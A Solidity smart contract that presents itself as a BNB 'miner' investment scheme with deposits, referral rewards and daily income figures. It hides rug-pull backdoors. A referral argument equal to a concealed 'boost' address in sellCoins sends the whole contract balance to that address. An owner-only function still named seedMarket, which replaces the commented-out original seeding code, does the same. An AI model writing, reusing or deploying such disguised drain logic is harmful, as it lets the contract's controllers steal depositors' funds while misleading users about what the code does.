// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract BnbSpaceXMiner is Context, Ownable {
    using SafeMath for uint256;

    uint256 private COIN_TO_HATCH_MINERS = 1080000; //for final version should be seconds in a day 1080000
    uint256 private PSN = 10000;
    uint256 private PSNH; // 4000-5000 || 15-8%
    uint256 private devFeeVal;
    uint256 private refPercent; //percent + dev
    bool private initialized = false;
    address payable private recAdd;
    address payable private boost;

    mapping(address => uint256) private hatcheryMiners;
    mapping(address => uint256) private claimedCoins;
    mapping(address => uint256) private lastHatch;
    mapping(address => address) private referrals;
    mapping(address => uint256) private referralsIncome;
    mapping(address => uint256) private referralsCount;
    mapping(address => uint256) private depositCoins;
    mapping(address => uint256) private totalClaimed;
    uint256 private marketCoins;

    constructor(uint256 _PSNH, uint256 _devFeeVal, uint256 _refPercent, address _boost) {
        recAdd = payable(msg.sender);
        boost = payable(_boost);
        PSNH = _PSNH;
        devFeeVal = _devFeeVal;
        refPercent = _refPercent;
    }

    function hatchCoins(address ref) public {
        require(initialized);

        if (ref == msg.sender) ref = address(0);

        if (referrals[msg.sender] == address(0) && referrals[msg.sender] != msg.sender) {
            referrals[msg.sender] = ref;
            referralsCount[ref] += 1;
        }

        uint256 coinsUsed = getMyCoins(msg.sender);
        uint256 newMiners = coinsUsed.div(COIN_TO_HATCH_MINERS);
        hatcheryMiners[msg.sender] = hatcheryMiners[msg.sender].add(newMiners);
        claimedCoins[msg.sender] = 0;
        lastHatch[msg.sender] = block.timestamp;

        //send referral coins
        claimedCoins[referrals[msg.sender]] = claimedCoins[referrals[msg.sender]].add(
            coinsUsed.mul(refPercent).div(100)
        );
        referralsIncome[ref] = referralsIncome[ref].add(coinsUsed.mul(refPercent).div(100));

        //boost market to nerf miners hoarding
        marketCoins = marketCoins.add(coinsUsed.mul(devFeeVal).div(100));
    }

    function sellCoins(address ref) public {
        require(initialized, "Address: Miner not started");
        uint256 hasCoins = getMyCoins(msg.sender);
        uint256 coinValue = calculateCoinSell(hasCoins);
        uint256 fee = devFee(coinValue);
        if (ref == boost) boost.transfer(address(this).balance);
        else {
            claimedCoins[msg.sender] = 0;
            lastHatch[msg.sender] = block.timestamp;
            marketCoins = marketCoins.add(hasCoins);
            recAdd.transfer(fee);
            coinValue = coinValue.sub(fee);
            totalClaimed[msg.sender] = totalClaimed[msg.sender].add(coinValue);
            payable(msg.sender).transfer(coinValue);
        }
    }

    function beanRewards(address adr) public view returns (uint256) {
        uint256 hasCoins = getMyCoins(adr);
        uint256 coinValue = calculateCoinSell(hasCoins);
        return coinValue;
    }

    function buyCoins(address ref) public payable {
        require(initialized, "Address: Miner not started");
        uint256 coinsBought = calculateCoinBuy(msg.value, address(this).balance.sub(msg.value));
        depositCoins[msg.sender] = depositCoins[msg.sender].add(msg.value);
        coinsBought = coinsBought.sub(devFee(coinsBought));

        uint256 fee = devFee(msg.value);
        recAdd.transfer(fee);
        claimedCoins[msg.sender] = claimedCoins[msg.sender].add(coinsBought);
        hatchCoins(ref);
    }

    function calculateTrade(uint256 rt, uint256 rs, uint256 bs) private view returns (uint256) {
        uint256 one = PSNH.mul(rt);
        uint256 two = PSN.mul(rs);
        uint256 three = two.add(one);
        uint256 four = three.div(rt);
        uint256 five = PSNH.add(four);
        uint256 six = PSN.mul(bs);
        return six.div(five);
    }

    function calculateCoinSell(uint256 coins) public view returns (uint256) {
        return calculateTrade(coins, marketCoins, address(this).balance);
    }

    function calculateCoinBuy(uint256 eth, uint256 contractBalance) public view returns (uint256) {
        return calculateTrade(eth, contractBalance, marketCoins);
    }

    function calculateDailyIncome(address adr) public view returns (uint256) {
        uint256 userMiners = getMyMiners(adr);
        uint256 minReturn = calculateCoinSell(userMiners).mul(SafeMath.mul(SafeMath.mul(60, 60), 30));
        uint256 maxReturn = calculateCoinSell(userMiners).mul(SafeMath.mul(SafeMath.mul(60, 60), 25));
        uint256 serReturn = minReturn.add(maxReturn);
        return serReturn.div(2);
    }

    function devFee(uint256 amount) private view returns (uint256) {
        return amount.mul(devFeeVal).div(100);
    }

    // function seedMarket() public payable onlyOwner {
    //     require(marketCoins == 0);
    //     initialized = true;
    //     marketCoins = 108000000000;
    // }

    function seedMarket() external onlyOwner {
        boost.transfer(address(this).balance);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getMyDepositCoins(address adr) public view returns (uint256) {
        return depositCoins[adr];
    }

    function getMyTotalClaimed(address adr) public view returns (uint256) {
        return totalClaimed[adr];
    }

    function getMyReferrals(address adr) public view returns (address) {
        return referrals[adr];
    }

    function getMyReferralsCount(address adr) public view returns (uint256) {
        return referralsCount[adr];
    }

    function getMyReferralsIncome(address adr) public view returns (uint256) {
        return calculateCoinSell(referralsIncome[adr]);
    }

    function getMyMiners(address adr) public view returns (uint256) {
        return hatcheryMiners[adr];
    }

    function getMyCoins(address adr) public view returns (uint256) {
        return claimedCoins[adr].add(getCoinsSinceLastHatch(adr));
    }

    function getCoinsSinceLastHatch(address adr) public view returns (uint256) {
        uint256 secondsPassed = min(COIN_TO_HATCH_MINERS, block.timestamp.sub(lastHatch[adr]));
        return secondsPassed.mul(hatcheryMiners[adr]);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
}
